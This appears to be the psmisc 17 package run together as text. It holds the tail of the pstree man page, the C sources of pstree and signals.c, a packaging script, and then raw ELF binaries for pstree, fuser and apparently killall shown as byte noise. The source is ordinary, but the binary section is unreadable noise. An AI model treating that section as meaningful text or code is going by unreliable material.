.IP \fB\-p\fP
Show PIDs. PIDs are shown as decimal numbers in parentheses after each
process name. \fB\-p\fP implicitly disables compaction.
.IP \fB\-u\fP
Show uid transitions. Whenever the uid of a process differs from the uid of
its parent, the new uid is shown in parentheses after the process name.
.IP \fB\-U\fP
Use UTF-8 (Unicode) line drawing characters. Under Linux 1.1-54 and above,
UTF-8 mode is entered on the console with \fBecho -e '\\033%8'\fP and left
with \fBecho -e '\\033%@'\fP
.IP \fB\-V\fP
Display version information.
.SH FILES
.nf
/proc	location of the proc file system
.fi
.SH AUTHOR
Werner Almesberger <werner.almesberger@lrc.di.epfl.ch>
.SH "SEE ALSO"
ps(1), top(1)
.\"{{{}}}
/* pstree.c - display process tree */

/* Copyright 1993-1996 Werner Almesberger. See file COPYING for details. */


#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <getopt.h>
#include <pwd.h>
#include <dirent.h>
#include <termios.h>
#include <termcap.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>

#include "comm.h"


#ifndef MAX_DEPTH
#define MAX_DEPTH    100
#endif
#define PROC_BASE    "/proc"

/* UTF-8 defines by Johan Myreen */
#define UTF_V	"\342\224\202\277"		/* Vertical line drawing char */
#define UTF_VR	"\342\224\234\277"		/* Vertical and right */
#define UTF_H	"\342\224\200\277"		/* Horizontal */
#define UTF_UR	"\342\224\224\277"		/* Up and right */
#define UTF_HD	"\342\224\254\277"		/* Horizontal and down */

#define VT_BEG	"\033(0\017"			/* use graphic chars */
#define VT_END	"\033(B"			/* back to normal char set */
#define VT_V	"x"				/* see UTF definitions above */
#define VT_VR	"t"
#define VT_H	"q"
#define VT_UR	"m"
#define	VT_HD	"w"

typedef struct _proc {
    char comm[COMM_LEN+1];
    char **argv;	/* only used : argv[0] is 1st arg; undef if argc < 1 */
    int argc;		/* with -a   : number of arguments, -1 if swapped    */
    pid_t pid;
    uid_t uid;
    int highlight;
    struct _child *children;
    struct _proc *parent;
    struct _proc *next;
} PROC;

typedef struct _child {
    PROC *child;
    struct _child *next;
}  CHILD;

static struct {
    const char *empty_2;	/*    */
    const char *branch_2;	/* |- */
    const char *vert_2;		/* |  */
    const char *last_2;		/* `- */
    const char *single_3;	/* --- */
    const char *first_3;	/* -+- */
} sym_ascii = { "  ",
	        "|-",
		"| ",
		"`-",
		"---",
		"-+-" },
  sym_utf =   { "  ",
		UTF_VR UTF_H,
		UTF_V " ",
		UTF_UR UTF_H,
		UTF_H UTF_H UTF_H,
		UTF_H UTF_HD UTF_H },
  sym_vt100 = { "  ",
		VT_BEG VT_VR VT_H VT_END,
		VT_BEG VT_V VT_END " ",
		VT_BEG VT_UR VT_H VT_END,
		VT_BEG VT_H VT_H VT_H VT_END,
		VT_BEG VT_H VT_HD VT_H VT_END },
  *sym = &sym_ascii;

static PROC *list = NULL;
static int width[MAX_DEPTH],more[MAX_DEPTH];
static int print_args = 0,compact = 1,user_change = 0,pids = 0,by_pid = 0,
  trunc = 1;
static output_width = 132;
static int cur_x = 1;
static char last_char = 0;
static int dumped = 0; /* used by dump_by_user */


static void out_char(char c)
{
    cur_x += (c & 0xc0) != 0x80; /* only count first UTF-8 char */
    if (cur_x <= output_width || !trunc) putchar(c);
    if (cur_x == output_width+1 && trunc)
	if (last_char || (c & 0x80)) putchar('+');
	else {
	    last_char = c;
	    cur_x--;
	    return;
	}
}


static void out_string(const char *str)
{
    while (*str) out_char(*str++);
}


static int out_int(int x) /* non-negative integers only */
{
    int digits,div;

    digits = 0;
    for (div = 1; x/div; div *= 10) digits++;
    if (!digits) digits = 1;
    for (div /= 10; div; div /= 10) out_char('0'+(x/div) % 10);
    return digits;
}


static void out_newline(void)
{
    if (last_char && cur_x == output_width) putchar(last_char);
    last_char = 0;
    putchar('\n');
    cur_x = 1;
}


static PROC *find_proc(pid_t pid)
{
    PROC *walk;

    for (walk = list; walk; walk = walk->next)
	if (walk->pid == pid) break;
    return walk;
}


static PROC *new_proc(const char *comm,pid_t pid,uid_t uid)
{
    PROC *new;

    if (!(new = malloc(sizeof(PROC)))) {
	perror("malloc");
	exit(1);
    }
    strcpy(new->comm,comm);
    new->pid = pid;
    new->uid = uid;
    new->highlight = 0;
    new->children = NULL;
    new->parent = NULL;
    new->next = list;
    return list = new;
}


static void add_child(PROC *parent,PROC *child)
{
    CHILD *new,**walk;
    int cmp;

    if (!(new = malloc(sizeof(CHILD)))) {
	perror("malloc");
	exit(1);
    }
    new->child = child;
    for (walk = &parent->children; *walk; walk = &(*walk)->next)
	if (by_pid) {
	    if ((*walk)->child->pid > child->pid) break;
	}
	else if ((cmp = strcmp((*walk)->child->comm,child->comm)) > 0) break;
	    else if (!cmp && (*walk)->child->uid > child->uid) break;
    new->next = *walk;
    *walk = new;
}


static void set_args(PROC *this,const char *args,int size)
{
    char *start;
    int i;

    if (!size) {
	this->argc = -1;
	return;
    }
    this->argc = 0;
    for (i = 0; i < size-1; i++)
	if (!args[i]) this->argc++;
    if (!this->argc) return;
    if (!(this->argv = malloc(sizeof(char *)*this->argc))) {
	perror("malloc");
	exit(1);
    }
    start = strchr(args,0)+1;
    size -= start-args;
    if (!(this->argv[0] = malloc((size_t) size))) {
	perror("malloc");
	exit(1);
    }
    start = memcpy(this->argv[0],start,(size_t) size);
    for (i = 1; i < this->argc; i++) this->argv[i] = start = strchr(start,0)+1;
}


static void add_proc(const char *comm,pid_t pid,pid_t ppid,uid_t uid,
  const char *args,int size)
{
    PROC *this,*parent;

    if (!(this = find_proc(pid))) this = new_proc(comm,pid,uid);
    else {
	strcpy(this->comm,comm);
	this->uid = uid;
    }
    if (args) set_args(this,args,size);
    if (pid == ppid) ppid = 0;
    if (!(parent = find_proc(ppid))) parent = new_proc("?",ppid,0);
    add_child(parent,this);
    this->parent = parent;
}


static int tree_equal(const PROC *a,const PROC *b)
{
    const CHILD *walk_a,*walk_b;

    if (strcmp(a->comm,b->comm)) return 0;
    if (user_change && a->uid != b->uid) return 0;
    for (walk_a = a->children, walk_b = b->children; walk_a && walk_b;
      walk_a = walk_a->next, walk_b = walk_b->next)
	if (!tree_equal(walk_a->child,walk_b->child)) return 0;
    return !(walk_a || walk_b);
}


static void dump_tree(PROC *current,int level,int rep,int leaf,int last,
  uid_t prev_uid,int closing)
{
    CHILD *walk,*next,**scan;
    const struct passwd *pw;
    int lvl,i,add,offset,len,swapped,info,count,comm_len,first;
    const char *tmp,*here;
    char comm_tmp[5];

    if (!current) return;
    if (level >= MAX_DEPTH-1) {
	fprintf(stderr,"MAX_DEPTH not big enough.\n");
	exit(1);
    }
    if (!leaf)
	for (lvl = 0; lvl < level; lvl++) {
	    for (i = width[lvl]+1; i; i--) out_char(' ');
	    out_string(lvl == level-1 ? last ? sym->last_2 : sym->branch_2 :
	       more[lvl+1] ? sym->vert_2 : sym->empty_2);
	}
    if (rep < 2) add = 0;
    else {
	add = out_int(rep)+2;
	out_string("*[");
    }
    if (current->highlight && (tmp = tgetstr("md",NULL))) tputs(tmp,1,putchar);
    if (swapped = print_args && current->argc < 0) out_char('(');
    comm_len = 0;
    for (here = current->comm; *here; here++)
	if (*here == '\\') {
	    out_string("\\\\");
	    comm_len += 2;
	}
	else if (*here > ' ' && *here <= '~') {
		out_char(*here);
		comm_len++;
	    }
	    else {
		sprintf(comm_tmp,"\\%03o",(unsigned char) *here);
		out_string(comm_tmp);
		comm_len += 4;
	    }
    offset = cur_x;
    info = pids || (user_change && prev_uid != current->uid);
    if (info) out_char(swapped ? ',' : '(');
    if (pids) (void) out_int(current->pid);
    if (user_change && prev_uid != current->uid) {
	if (pids) out_char(',');
	if ((pw = getpwuid(current->uid))) out_string(pw->pw_name);
	else (void) out_int(current->uid);
    }
    if (info || swapped) out_char(')');
    if (current->highlight && (tmp = tgetstr("me",NULL))) tputs(tmp,1,putchar);
    if (print_args) {
	for (i = 0; i < current->argc; i++) {
	    out_char(' ');
	    len = 0;
	    for (here = current->argv[i]; *here; here++)
		len += *here > ' ' && *here <= '~' ? 1 : 4;
	    if (cur_x+len <= output_width-(i == current->argc-1 ? 0 : 4))
		for (here = current->argv[i]; *here; here++)
		    if (*here > ' ' && *here <= '~') out_char(*here);
		    else {
			sprintf(comm_tmp,"\\%03o",(unsigned char) *here);
			out_string(comm_tmp);
		    }
	    else {
		out_string("...");
		break;
	    }
	}
    }
    if (print_args || !current->children) {
	while (closing--) out_char(']');
	out_newline();
	if (print_args) {
	    more[level] = !last;
	    width[level] = swapped+(comm_len > 1 ? 0 : -1);
	    for (walk = current->children; walk; walk = walk->next)
		dump_tree(walk->child,level+1,1,0,!walk->next,current->uid,0);
	}
    }
    else {
	more[level] = !last;
	width[level] = comm_len+cur_x-offset+add;
	if (cur_x >= output_width && trunc) {
	    out_string(sym->first_3);
	    out_string("+");
	    out_newline();
	}
	else {
	    first = 1;
	    for (walk = current->children; walk; walk = next) {
		count = 0;
		next = walk->next;
		if (compact) {
		    scan = &walk->next;
		    while (*scan)
			if (!tree_equal(walk->child,(*scan)->child)) 
			    scan = &(*scan)->next;
			else {
			    if (next == *scan) next = (*scan)->next;
			    count++;
			    *scan = (*scan)->next;
			}
		}
		if (first) {
		    out_string(next ? sym->first_3 : sym->single_3);
		    first = 0;
		}
		dump_tree(walk->child,level+1,count+1,walk == current->children,
		  !next,current->uid,closing+(count ? 1 : 0));
	    }
	}
    }
}


static void dump_by_user(PROC *current,uid_t uid)
{
    const CHILD *walk;

    if (current->uid == uid) {
	if (dumped) putchar('\n');
	dump_tree(current,0,1,1,1,uid,0);
	dumped = 1;
	return;
    }
    for (walk = current->children; walk; walk = walk->next)
	dump_by_user(walk->child,uid);
}


static void read_proc(void)
{
    DIR *dir;
    struct dirent *de;
    FILE *file;
    struct stat st;
    char path[PATH_MAX+1],comm[COMM_LEN+1];
    char *buffer;
    pid_t pid,ppid;
    int fd,size;
    int empty,dummy;

    if (!print_args) buffer = NULL;
    else if (!(buffer = malloc((size_t) (output_width+1)))) {
	    perror("malloc");
	    exit(1);
	}
    if (!(dir = opendir(PROC_BASE))) {
	perror(PROC_BASE);
	exit(1);
    }
    empty = 1;
    while (de = readdir(dir))
	if (pid = atoi(de->d_name)) {
	    sprintf(path,"%s/%d/stat",PROC_BASE,pid);
	    if (file = fopen(path,"r")) {
		empty = 0;
		if (fstat(fileno(file),&st) < 0) {
		    perror(path);
		    exit(1);
		}
		if (fscanf(file,"%d (%[^)]) %c %d",&dummy,comm,(char *) &dummy,
		  &ppid) == 4) {
		    if (!print_args) add_proc(comm,pid,ppid,st.st_uid,NULL,0);
		    else {
			sprintf(path,"%s/%d/cmdline",PROC_BASE,pid);
			if ((fd = open(path,O_RDONLY)) < 0) {
			    perror(path);
			    exit(1);
			}
			if ((size = read(fd,buffer,(size_t) output_width)) < 0)
			  {
			    perror(path);
			    exit(1);
			}
			(void) close(fd);
			if (size) buffer[size++] = 0;
			add_proc(comm,pid,ppid,st.st_uid,buffer,size);
		    }
		}
		(void) fclose(file);
	    }
	}
    (void) closedir(dir);
    if (print_args) free(buffer);
    if (empty) {
	fprintf(stderr,PROC_BASE " is empty (not mounted ?)\n");
	exit(1);
    }
}


#if 0

/* Could use output of  ps achlx | awk '{ print $3,$4,$2,$13 }'  */

static void read_stdin(void)
{
    char comm[PATH_MAX+1];
    char *cmd;
    int pid,ppid,uid;

    while (scanf("%d %d %d %s\n",&pid,&ppid,&uid,comm) == 4) {
	if (cmd = strrchr(comm,'/')) cmd++;
	else cmd = comm;
	if (*cmd == '-') cmd++;
	add_proc(cmd,pid,ppid,uid,NULL,0);
    }
}

#endif


static void usage(void)
{
    fprintf(stderr,"usage: pstree [ -a ] [ -c ] [ -h ] [ -l ] [ -n ] [ -p ] "
      "[ -u ] [ -G | -U ]\n%14s[ pid | user]\n","");
    fprintf(stderr,"       pstree -V\n\n");
    fprintf(stderr,"    -a     show command line arguments\n");
    fprintf(stderr,"    -c     don't compact identical subtrees\n");
    fprintf(stderr,"    -h     highlight current process and its ancestors\n");
    fprintf(stderr,"    -G     use VT100 line drawing characters\n");
    fprintf(stderr,"    -l     don't truncate long lines\n");
    fprintf(stderr,"    -n     sort output by PID\n");
    fprintf(stderr,"    -p     show PIDs; implies -c\n");
    fprintf(stderr,"    -u     show uid transitions\n");
    fprintf(stderr,"    -U     use UTF-8 (Unicode) line drawing characters\n");
    fprintf(stderr,"    -V     display version information\n");
    fprintf(stderr,"    pid    start at pid, default 1 (init)\n");
    fprintf(stderr,"    user   show only trees rooted at processes of that "
      "user\n\n");
    exit(1);
}


int main(int argc,char **argv)
{
    PROC *current;
    struct winsize winsz;
    const struct passwd *pw;
    pid_t pid,highlight;
    char termcap_area[1024];
    int c;

    if (ioctl(1,TIOCGWINSZ,&winsz) >= 0)
	if (winsz.ws_col) output_width = winsz.ws_col;
    pid = 1;
    highlight = 0;
    pw = NULL;
    while ((c = getopt(argc,argv,"acGhnpluUV")) != EOF)
	switch (c) {
	    case 'a':
		print_args = 1;
		break;
	    case 'c':
		compact = 0;
		break;
	    case 'G':
		if (sym != &sym_ascii) usage();
		sym = &sym_vt100;
		break;
	    case 'h':
		if (getenv("TERM") && tgetent(termcap_area,getenv("TERM")) > 0)
		    highlight = getpid();
		break;
	    case 'l':
		trunc = 0;
		break;
	    case 'n':
		by_pid = 1;
		break;
	    case 'p':
		pids = 1;
		compact = 0;
		break;
	    case 'u':
		user_change = 1;
		break;
	    case 'U':
		if (sym != &sym_ascii) usage();
		sym = &sym_utf;
		break;
	    case 'V':
		fprintf(stderr,"pstree from psmisc version " PSMISC_VERSION
		  "\n");
		return 0;
	    default:
		usage();
	}
    if (optind == argc-1)
	if (isdigit(*argv[optind])) {
	    if (!(pid = atoi(argv[optind++]))) usage();
	}
	else if (!(pw = getpwnam(argv[optind++]))) {
		fprintf(stderr,"No such user name: %s\n",argv[optind-1]);
		return 1;
	    }
    if (optind != argc) usage();
    read_proc();
    for (current = find_proc(highlight); current; current = current->parent)
	current->highlight = 1;
    if (!pw)
	dump_tree(find_proc(pid),0,1,1,1,0,0);
    else {
	dump_by_user(find_proc(1),pw->pw_uid);
	if (!dumped) {
	    fprintf(stderr,"No processes found.\n");
	    return 1;
	}
    }
    return 0;
}
/* signals.c - signal name handling */

/* Copyright 1993-1995 Werner Almesberger. See file COPYING for details. */


#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include "signals.h"


typedef struct {
    int number;
    const char *name;
} SIGNAME;


static SIGNAME signals[] = {
#include "signames.h"
  { 0,NULL }};


void list_signals(void)
{
    SIGNAME *walk;
    int col;

    col = 0;
    for (walk = signals; walk->name; walk++) {
	if (col+strlen(walk->name)+1 > 80) {
	    putchar('\n');
	    col = 0;
	}
	printf("%s%s",col ? " " : "",walk->name);
	col += strlen(walk->name)+1;
    }
    putchar('\n');
}


int get_signal(char *name,const char *cmd)
{
    SIGNAME *walk;

    if (isdigit(*name))
	return atoi(name);
    for (walk = signals; walk->name; walk++)
	if (!strcmp(walk->name,name)) break;
    if (walk->name) return walk->number;
    fprintf(stderr,"%s: unknown signal; %s -l lists signals.\n",name,cmd);
    exit(1);
}
#!/bin/sh
VERSION=`cat ./VERSION`
cd ..
tar cvf - psmisc/VERSION psmisc/README psmisc/INSTALL psmisc/CHANGES \
  psmisc/COPYING psmisc/psmisc-$VERSION.lsm \
  psmisc/Makefile psmisc/comm.h psmisc/signals.h \
  psmisc/*.[c1] psmisc/mkdist | gzip -9 >psmisc-$VERSION.tar.gz
ELF               4   $      4    (      4   44                                       !  !            "                 (#  ((            /lib/ld-linux.so.1  %   4       &          (                                      .   /       1          -            ,   
          +            %         *                       0                     !              )   2              3                                                   	      "           $       '            #                                                          "      (     '   g      .   l     @   (<      G   X    "   N         X         ^        d       "   j       "   q        y        
    H4                 h         g        <            "      <   "              T            "          "      T        8    "      H$      	  h    "     xF               %      "   -  l     ;  p     B      "   G  ,      N      "   V        ]  ~     f  (     o  8&   "   w  XX        xK        >            "         "         "                                libtermcap.so.2 strcpy ioctl _DYNAMIC getenv __strtol_internal memcpy malloc __environ _init tputs fopen fclose tgetent _fini atexit _GLOBAL_OFFSET_TABLE_ exit strchr tgetstr free libc.so.5 putchar __ctype_b _IO_stdout_ getpid fscanf _IO_stderr_ perror __overflow readdir __libc_init environ fprintf __fpu_control optind read getopt opendir strcmp getpwuid getpwnam sprintf _fxstat fileno __setfpucw open closedir close _etext _edata __bss_start _end       l!  p"                               
  #    $      %  &  '  (  )     *    +  ,  -    .     /  $  C    5%    %h    %h   %h   %h   %h    %h(   %h0   %h8   p%h@   `%hH   P%hP   @%hX   0%h`    %hh   %hp    %hx   %h   %h   %h   %h   %h   %h   %h   %h   p%h   `%h   P% h   @%h   0%h    %h   %h    %h   %h   %h  % h  %$h          Y1UUUPSQ       D$ lPL4hJ1  P[&    &       &    S= t; u[6US]%   =   tpp9l}	=h u09wPhXv l@9puM=h tD=t u}+9wj+h +tp]]US]; tPC&; u]]v UWVS}1   tFEuu,   %v E
   0UP
   ue[^_]6U=t tHp9lu;9wtPhv tt 9wj
h6 
p   ]UUPt9Pt@0u]UWVS}fuj4uhUj~6WSUSfs C$    C(    C,    PC0Pe[^_]UWVSujuhj67](Uz( tGv =d t @9F|/#V Pyu f@ f9F r
; uG;e[^_]v UWVS}uUB   MA    1G9}G6U< uMAC9|Uz    J    P/UBuhj!j MQUp+E)WUBuhjv MYWVP3   U9Z~6j VMAF4C9Ye[^_]UWVS}f]URuPURURURVf^ } tURURV9}u1W[uj WheVS^,e[^_]UVS]uVSu=\ tfC f9F t1;[(v(t"6tPPt[vu1u	u   e[^]U(WVS}fUfU} [  }b~hhqjJ6} ut19]~mv 4tFt6j aNuEH9u} tL@*v L@6< t
L@L PC9]	E    WEhMy$ t#j hthjPE    =T tUz }E} t
j(E    ]; tZu;\uh-E8<]wPOEv PhVVEC; upM1=` u=\ tfMUf9J t   t(   } t,   P=` tUBP=\ tQfUMf9Q tD=` t
j,MA Pt P=v UB PSu} t
j)SMy$ t#j h_thjP=T    1U9r   }6j E    MA; t<]wEv EC; u]pUBH9tl9~
P9l|HMA; tJ6<]wP6PhWW'C; uhFU9r7=T uMy(    v j]M } ul=T   } %   UMt}tUr(y  j MA P~ %   Pj jE@PPvuB  } %   UEp+EEtp9l+=h t"L@Ph   E   Mq(   v E    ~=X t;^t46 PPu9;uE@; u} t(tL@
6L@P^E    E } t@PUB P%   P9r(%   PE@PE@PP;e[^_]UVS]fuf9s uZ=x t/9wj
hv  
j Pjjjj Sx   %6[(t  v VP{[ue[^]Ut  WVS=T u    /v l@P(uhj6huhj   6Q  
j j
j P6tWhhQVhQt    PhEPRj7}Qj-PPQPhQ   =T uj j    v WhhQj Q}Qzjv lPQV}QHjqVt CSQEPPWQQTQd=T tQ| th hj6[^_]v Uh h!hhhhhhh$hhhhhMhthshe hhShhDhh5hh& h5hh`hj6U  WVSPhT  j-|f tl   116hURUR  .  $v b8HXtT   =LtL4hhP Ph    d   }`   X    cv \   Q=LtL0hh  6EH9pu{UDPu;Qp7uQpUDPhhr      pUpj j
j PuUU9ptEV6tv @$   @,ut:CPjP=x u4hh    v j j jjjj WP1[^_]S|=|t;u[6    k  -+- --- `- |  |-          (0qwq(B (0qqq(B (0mq(B (0x(B  (0tq(B malloc ? MAX_DEPTH not big enough.
 *[ md \\ \%03o me ... + /proc %s/%d/stat r %d (%[^)]) %c %d %s/%d/cmdline /proc is empty (not mounted ?)
  usage: pstree [ -a ] [ -c ] [ -h ] [ -l ] [ -n ] [ -p ] [ -u ] [ -G | -U ]
%14s[ pid | user]
        pstree -V

     -a     show command line arguments
     -c     don't compact identical subtrees
     -h     highlight current process and its ancestors
     -G     use VT100 line drawing characters
     -l     don't truncate long lines
     -n     sort output by PID
     -p     show PIDs; implies -c
     -u     show uid transitions
     -U     use UTF-8 (Unicode) line drawing characters
     -V     display version information
     pid    start at pid, default 1 (init)
     user   show only trees rooted at processes of that user

 acGhnpluUV TERM pstree from psmisc version 17
 No such user name: %s
 No processes found.
            )&# )UOF9,)~ti^                                                (        .>N^n~.>N^n~                           T
                                       X   (                           01.01             01.01             01.01    GCC: (GNU) 2.7.2.l.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2.l.2  .symtab .strtab .shstrtab .interp .hash .dynsym .dynstr .rel.bss .rel.plt .init .plt .text .fini .rodata .data .ctors .dtors .got .dynamic .bss .note .comment                                                                         #            l               )         TT  @              1                            9   	      XX  (               B   	                       K                             Q           P                V                              \                             b                            j           "  |                  p         ||"                    w         "                    ~         "                            ((#                           #                                 #  <                                #  >                                2$                    ELF               4   $1      4    (      4   44                                       Q-  Q-           X-  XX  L           \/  \\            /lib/ld-linux.so.1  %   4   %   #   
                            	                .   '       1   )                  ,              +      /      !   -   *                          0                                                                                                                     "       $   (   2       &           3                                          "      (   "      \     !        +   l     =   T     I       "   P       "   W       "   ]   (<      d   HT     p   8    "   w   H$         X    "      h    "      x    "      <        X         X         X                 F         X             "          "      9             "           	  &   "     O        (    "     8    "   $  H    "   ,  XC      4  h      ;  x~     D  M     R       
 X        f  &   "   n  4      u                 >        g           "         "                                libc.so.5 popen printf _DYNAMIC __ctype_b __strtol_internal _IO_stdout_ getpid fscanf fgets memcpy _IO_stderr_ perror __overflow getuid malloc readdir __strtoul_internal _lxstat _xstat __environ _init __libc_init environ fprintf kill inet_addr chdir __fpu_control sscanf strdup fopen fclose opendir seteuid strcmp getpwuid gethostbyname _fini getservbyname sprintf atexit _GLOBAL_OFFSET_TABLE_ exit __setfpucw strchr closedir free _etext _edata __bss_start _end      H              	  
                                    $   (!  ,"  0#  4$  8%  <'  @(  D)  H+  L,  P-  T.  X/          5%    %h    %h   %h   %h   %h    %h(   %h0   %h8   p%h@   `%hH   P%hP   @%hX   0%h`    %hh   % hp    %hx   %h   %h   %h   %h   %h   %h   % h   %$h   p%(h   `%,h   P%0h   @%4h   0%8h    %<h   %@h    %Dh   %Hh   %Lh  %Ph  %Th  %Xh           Y1UUUPSQ       D$XP|ThJ:  PG[&    &       &    S= t; u[6U  WVSUz   B   Ph ShS%uS"jv 1Rh   PRh   WtwjuhjJ6CPCPCPShWpu{ uS\v C    t^UZsv RX[^_]v UL  WVS=       hhBuhBj1Qh   Pv Qh   WtsVPhQWpuEPVj|jfEfEBBB    tS	v wv Q4[^_]v UUt9Pu ]@u1]v UHWVS} t	UUURE=  v W UGt}    G9Et   G9E   U9W   ? uw t.68 uU9P}
6> u> tU9PuOjmuh*jv     USCC    C   U	SGt#{uEPURj4|US}e[^_]UWVS   z BtB9Et   B9E   M9Ju|: uRrz t66> uj{uh8jMMQCuhpjv C   Me[^_]v U@WVSu}]EPVj.|SWEPEPVe[^_]U  WVS}hWr   v Vh   S@tmPPPhwS	u u u	 tURURPPWV[^_]U  WVSURtr RtM
    t    tPURhSURURSzR[^_]v U  WVSh.uhj   6W2   
j j
j Pt    Vhh SSh|jVhjVhjVh$jVhjVhjVh$jVhh@W thhHj[^_]v U"  WVShh(  <$8 <6(Rh   $R|i   RWh$RHuEPWj|fEf% f= `   fEff   Wh4ShSuSh hHF6,P0PhVuW,P0PPjV8@PSj}S6j  R.EP Rj  RDP@PEPjt(R[^_]v UT  WVShh"   Ph   PRh   RtteRShRDu    uEPSj|SEPEPPj|R[^_]v U8  WVS     9   y u=    t*Ath.jh/8    1; tm;\uhTQ6<]w49wPhQGPhWC; uy tA Ph]AuM9wj: :*69wj h6  G~   q`  A   > ;  FtFPhaFtFPheFtFPhjFtFPhoFtFPhtA  ~  FP	t
 Phy	FPh~Jx  6t
w}kv FPhShSUt"PPhSS=^-N1v PhhHjv u&P'tSh]S= uh.jhv ~h.jh:Sh,   r         F.   um   R.   Fte   P.   Ftc   P.   Ftr   P.   Ftf   PFPh v hhhz tu; tjv ;\uhTQM<]w49wPh%v 6PhWC; u9wj
hPv  
    vAt	 tI9wj
h6 
 th
hHJA   q   tQrtVt]vv 9NthAP^S}NSh?]SSJ4FPhGFPhGPhthHvjI [^_]6UWVS}fuj$uhjB6= t+W PuU9Pu	    !WVuhpcjUSUSC    C     fsUSUS= tX 	v C; te[^_]v UWVSEPuhpjV6MMM    1   j,SEt th
t      ;    Ej j PSE8 tMQStff@t	MV6MM; tGSM9u4SNt!{uCCPRMQv 1F1 _   e[^_]Uh.hhH%h"hHh3hHhEhH$hmhHhhHhhHhhH h hHh@hHhnhHhhHz hhHhhhHYhhHJjCv Ud  WVS        	   \   }}  }w/      _  1H  E}8-  x u    	     v }8   61 ^  $hv             MunE\=\ t?v P}Pt? u? Y  O  6   e\v Pv h2hH1  6}DP	thPQ]  @   }: C  6            \u}PRjZ}Uj/}Pt?9t;\=\ t-{6PWn> u\^  }PRj|W   tgff% f= `tHf= @uP}PhV PPRj}P  ffff% f= t   tff% f= u   t3j PPWW}P    6ff9u/C9u$j CPj WW}PT[u   VPPPP}PuPPh[hHoo6^tft
9uK tC9u7tC9u#VCPj WW}P[uM. u= t t	8' u/E%  P:}hz	   6= %   [^_]UWVS1=    v ~0Pv09wj
h6 
1FP!tRh"~0M~ w9wj
h* 
e[^_]UWVSu}DPtj j
j VOv = t&6VCPt	{ u{ tWVh'hHje[^_]S=t;u[6  udp tcp file /proc/net/%s r malloc %*d: %*x:%x %lx:%x %*x %*x:%*x %*x:%*x %*x %*d %*d %ld /proc/net/unix %*x: %*x %*x %*x %*x %*x %d %s strdup %*s %*s %*s %x:%x %ld . .. %s/%s /proc %s/%d root cwd exe lib mmap maps fd /proc is empty (not mounted ?)
 /proc/mounts %s %s losetup %s popen(%s) failed
 %*s [%x]:%d /.. /proc/swaps  
%*s USER        PID ACCESS COMMAND
 \\ \%03o /%s %6d %6dr %6dc %6de %6dm (%s) (%d) /proc/%d/stat ??? %d (%[^)] Internal error (type %d)
 %d %*s 
%*s  %-8s  %6d %c%c%c%c%c   kernel mount   kernel loop    kernel swap    No process references; use -v for the complete list
 kill %d No automatic removal. Please use  umount %s
 No automatic removal. Please use  swapoff %s
 usage: fuser [ -a | -q ] [ -n space ] [ -signal ] [ -kmuv ] filename ...
%13s[ - ] [ -n space ] [ -signal ] [ -kmuv ] name ...
        fuser -l
        fuser -V

     -a        display unused files too
     -k        kill processes accessing that file
     -l        list signal names
     -m        mounted FS
     -n space  search in the specified name space (file, udp, or tcp)
     -s        silent operation
     -signal   send signal instead of SIGKILL
     -u        display user ids
     -v        verbose output
     -V        display version information
     -         reset options

   udp/tcp names: [local_port][,[rmt_host][,[rmt_port]]]

 -l fuser from psmisc version 17
 fuser %s/. %s/%s: invalid specificiation
 seteuid UNUSED PWR IO WINCH PROF VTALRM XFSZ XCPU URG TTOU TTIN TSTP STOP CONT CHLD STKFLT TERM ALRM PIPE USR2 SEGV USR1 KILL FPE BUS IOT ABRT TRAP ILL QUIT INT HUP    %s%s %s: unknown signal; %s -l lists signals.
                                                                                       	             	   
                                                                                  \        .>N^n~.>N^n~                     T
                        (              d                               01.01             01.01             01.01             01.01    GCC: (GNU) 2.7.2.l.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2.l.2  .symtab .strtab .shstrtab .interp .hash .dynsym .dynstr .rel.bss .rel.plt .init .plt .text .fini .rodata .data .ctors .dtors .got .dynamic .bss .note .comment                                                                       #            l               )         TT  @              1                            9   	      dd                  B   	        (              K                             Q           `                V                              \         &                    b         &  i                 j         XX-  T                 p         .                    w         .                    ~         .                            \\/                           /                                  /  P                                40  P                                0                    ELF              4   "      4    (      4   44                                                           H                            /lib/ld-linux.so.1  %   3      %                                             !   -       $   0   (                   +       .       *      2      #   ,   )   
                               /           	                                                                                                        '   1       &       "                                                  (   "      #      "        +   h     5   l      ;   l     M   pT     Y       "   `       "   g       "   m   T     y       "      $             "      (H  "      8    "      HX         X    "               p         hF         x                      "       T            "      t                &            "                 "   $      "   +      "   3  8     ;  (      B       
 H  8&   "   P  H4      W  P     m  X      r  h>      }  xg           "     l              h       h             libc.so.5 strcpy printf strerror _DYNAMIC __ctype_b errno __strtol_internal _IO_stdout_ getpid fscanf fgets _IO_stderr_ perror __overflow malloc sleep readdir _xstat fflush __environ _init __libc_init strrchr environ fprintf _IO_stdin_ kill __fpu_control strstr strncmp realloc strtok fopen fclose opendir __uflow strcmp _fini sprintf atexit _GLOBAL_OFFSET_TABLE_ exit __setfpucw strchr closedir _errno _etext _edata __bss_start _end  h  p       t  l.  \  `  d  h  l	  p
  t  x  |                             !  "  #  $  %  '  (  *  +  ,  -          5T%X    %\h    %`h   %dh   %hh   %lh    %ph(   %th0   %xh8   p%|h@   `%hH   P%hP   @%hX   0%h`    %hh   %hp    %hx   %h   %h   %h   %h   %h   %h   %h   %h   p%h   `%h   P%h   @%h   0%h    %h   %h    %h   %h           Y1UUUPSQ       D$ tPhZz  PW[&    &       &    SL=L t; u[6Uh    |hh~   6Pj~hZ   h   u hhj j
j P Phj P P   b6P      ]6US]|c6 @t^	tXEv tt"6 PSu    ,v  PSu   8 u1]]UWVS}uVWhhpzv $9(wh 6$$u	j :6Cv tv $9(wh $ $u	j 6
uytntYt	NC1ytYu   e[^_]U(  WVSU    P\uh%j~619u   j/MPu/f(  0U<H8MPQj}UPjv F9uzU    h{uhXj   h   auh*jv     6WN   
j j
j Pt9t9u=    PRuhjv Aov W
